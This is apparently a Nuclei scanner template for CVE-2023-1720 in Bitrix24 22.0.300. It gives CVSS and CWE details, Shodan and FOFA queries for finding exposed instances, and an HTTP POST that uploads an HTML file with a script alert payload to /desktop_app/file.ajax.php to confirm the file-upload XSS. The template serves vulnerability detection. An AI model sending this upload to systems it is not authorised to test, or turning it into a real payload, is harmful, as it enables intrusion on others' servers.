id: CVE-2023-1720

info:
  name: Bitrix24 Unrestricted File Upload leading to XSS
  author: ProjectDiscoveryAI
  severity: critical
  description: Lack of mime type response header in Bitrix24 22.0.300 allows authenticated remote attackers to execute arbitrary JavaScript code in the victim's browser, and possibly execute arbitrary PHP code on the server if the victim has administrator privilege, via uploading a crafted HTML file through /desktop_app/file.ajax.php?action=uploadfile.
  impact: |
    Allows an attacker to upload malicious files and execute XSS attacks
  remediation: |
    Implement file upload restrictions and input validation to prevent XSS
  reference: https://starlabs.sg/advisories/23/23-1720/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
    cvss-score: 9.6
    cve-id: CVE-2023-1720
    cwe-id: CWE-434
    epss-score: 0.00154
    epss-percentile: 0.52867
    cpe: cpe:2.3:a:bitrix24:bitrix24:22.0.300:*:*:*:*:*:*:*
  metadata:
    vendor: bitrix24
    product: bitrix24
    shodan-query: html:"/bitrix/"
    fofa-query:
      - body="/bitrix/"
      - icon_hash=-2115208104

http:
  - method: POST
    path:
      - "{{BaseURL}}/desktop_app/file.ajax.php?action=uploadfile"

    body: |
      <html>
        <body>
          <script>alert(document.domain)</script>
        </body>
      </html>

    headers:
      Content-Type: text/html
    matchers:
      - type: word
        words:
          - "The file has been uploaded successfully"
        part: body
